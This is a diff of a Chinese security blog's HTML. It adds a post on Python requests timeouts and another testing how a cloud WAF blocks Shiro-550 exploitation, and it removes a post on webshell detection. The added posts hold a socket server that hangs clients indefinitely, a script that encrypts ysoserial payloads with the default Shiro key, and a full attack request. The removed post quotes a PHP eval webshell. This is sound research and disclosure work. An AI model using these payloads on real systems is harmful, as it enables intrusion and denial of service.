+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么实现的connect超时控制?</p>
+<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
+<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
+
+<p>流程如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
+
+<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
+</li>
+<li><p>什么是read超时?</p>
+<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
+<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
+<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
+<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
+<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
+<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
+<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
+<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
 <ul>
-<li>基于模糊哈希</li>
-<li>基于模糊正则</li>
-<li>基于代码风格</li>
-<li>基于机器学习：模型使用svm，特征包括了三个维度（代码风格、操作序列、操作名）</li>
-</ul>
+<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
 </li>
-</ul>
-<h2 id="模糊哈希"><a href="#模糊哈希" class="headerlink" title="模糊哈希"></a>模糊哈希</h2><ul>
-<li><p>是什么？</p>
-<p>用<code>ssdeep</code>命令来实践，看一下生成的模糊哈希。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# echo 11 &gt;&gt; &#x2F;usr&#x2F;bin&#x2F;sleep1</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7B:O35Q2Vo5FWkfJ8nXX7B,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br></pre></td></tr></table></figure>
+<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
+<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<p>可以看出来，<code>/usr/bin/sleep1</code> 在添加了两个字节的数据后，算出来的模糊哈希虽然和原来的不同，但是很相似。</p>
-<p>所以可以得出结论：如果文件的”模糊哈希”相似，就很可能文件内容非常相似。</p>
-</li>
-<li><p>cloudwalker怎么用”模糊哈希”检测webshell？</p>
-<p>在 tool/webshell-detector/bin/static/model-latest/SampleHash.txt 文件有计算好的”webshell模糊哈希列表”</p>
-<p>在检测文件时，先计算出”检测对象”的模糊哈希，然后和”webshell模糊哈希列表”做相似度比较</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1027/201021_0352ba68_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
 </li>
 </ul>
-<h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><ul>
-<li><p>是什么？</p>
-<p>从代码字符串中统计出的如下信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* WM：代码中的单词总数</span><br><span class="line">* LM：代码行数</span><br><span class="line">* SPL：代码中的分号数量&#x2F;总行数</span><br><span class="line">* SR：符号比例 &#x3D; 符号长度&#x2F;总长度</span><br><span class="line">* ...</span><br></pre></td></tr></table></figure>
-
-<p>这一部分业务逻辑在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/src/Stat.go">Stat.go</a></p>
-</li>
-<li><p>cloudwalker怎么用”代码风格”检测webshell？</p>
-<p>在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/bin/static/config/statState.json">statState.json</a> 中允许用户配置”代码风格合理范围”。cloudWalker计算出”检测对象”的”代码风格”后，会检查是否在此范围内。</p>
-<p>另外，”代码风格”信息会作为机器学习模型中的特征。</p>
-</li>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
+<ul>
+<li>dns解析阶段 不受timeout参数控制</li>
+<li>connect阶段 受timeout参数控制</li>
+<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
 </ul>
-<h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
-<li><p>cloudwalker怎么用”机器学习”检测webshell？</p>
-<p>使用了两层的机器学习。</p>
-<p>第一层模型使用svm算法，特征包括三类：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 前面说的&quot;代码风格&quot;</span><br><span class="line">* &quot;操作序列模型&quot;的预测结果</span><br><span class="line">* &quot;操作名称模型&quot;的预测结果</span><br></pre></td></tr></table></figure>
+<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
+<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
 
-<p><img src="https://images.gitee.com/uploads/images/2021/1027/201048_9220c5df_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-</li>
-<li><p>“操作序列模型”是什么？</p>
-<p>训练好的模型在 tool/webshell-detector/bin/static/model-latest/OpSerial.model</p>
-<p>它使用svm算法，特征是”操作序列”处理后的数据。</p>
-<p>“操作序列”包含了php代码中的”操作特征”。</p>
-</li>
-<li><p>怎么生成”操作序列”？</p>
-<p>由代码获取到抽象语法树后，再由抽象语法树生成”操作序列”。</p>
-<p>举个例子：</p>
-<p>假设待检测的php代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
 
-<p>代码生成的抽象语法树（ast）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:512,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:256,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;name&quot;:&quot;_POST&quot;&#125;&#125;,&quot;dim&quot;:0&#125;&#125;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://images.gitee.com/uploads/images/2021/1027/201109_7cf149be_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-<p>对应的”操作序列”如下：</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1027/201126_9af5fb47_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-<p>可以看出来，”操作序列”包含了”抽象语法树”两层之间的联系。</p>
-</li>
-</ul>
-<h2 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h2><ul>
-<li><p>怎么生成”抽象语法树”？</p>
-<p>代码在 tool/webshell-detector/php 目录。</p>
-<p>流程如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 在cloudwalker启动时，[php.c](https:&#x2F;&#x2F;github.com&#x2F;leveryd&#x2F;cloudwalker-source-read&#x2F;blob&#x2F;master&#x2F;tool&#x2F;webshell-detector&#x2F;php&#x2F;php.c)新建子线程，并等待输入。</span><br><span class="line">* 子线程接收php代码后，解析生成&quot;抽象语法树&quot;，将结果返回给主线程。子线程通过管道与主线程通信。</span><br></pre></td></tr></table></figure>
+    
+    
+    
 
-<p>解析能力基于<a target="_blank" rel="noopener" href="https://github.com/nikic/php-ast">php-ast项目</a>，业务逻辑可以见<a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/php/payload/index.php">index.php</a></p>
-<p>可以运行index.php做一点简单的测试：输入包括”字符串长度”和”代码”，输出ast字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  php git:(master) ✗ .&#x2F;bin&#x2F;php payload&#x2F;index.php</span><br><span class="line">26</span><br><span class="line">&lt;?php eval(&#39;$_POST[0]&#39;);?&gt;</span><br><span class="line">142</span><br><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&quot;$_POST[0]&quot;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
+<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
+<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
+<ol>
+<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
+<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
+</ol>
+<p>第二个方法存在两个问题：</p>
+<ol>
+<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
 </li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/">仓库</a>中放了我阅读代码时的注释，方便有需要的读者。</p>
-<p>从测试效果来看，开源版本和目前线上版本有很大差异：开源版本cloudwalker比较容易绕过，<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">线上</a>则难度大很多。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1027/201155_7f9c8ee0_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
+<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
+</li>
+</ol>
+<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>测试攻击请求</p>
+<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
+<p> 发送请求后，阿里云waf拦截</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试正常请求</p>
+<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
+<p> 结论：正常请求阿里云waf未拦截</p>
+</li>
+</ol>
+<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
+<ol>
+<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
+<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
+</ol>
+<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
 
       
     </div>
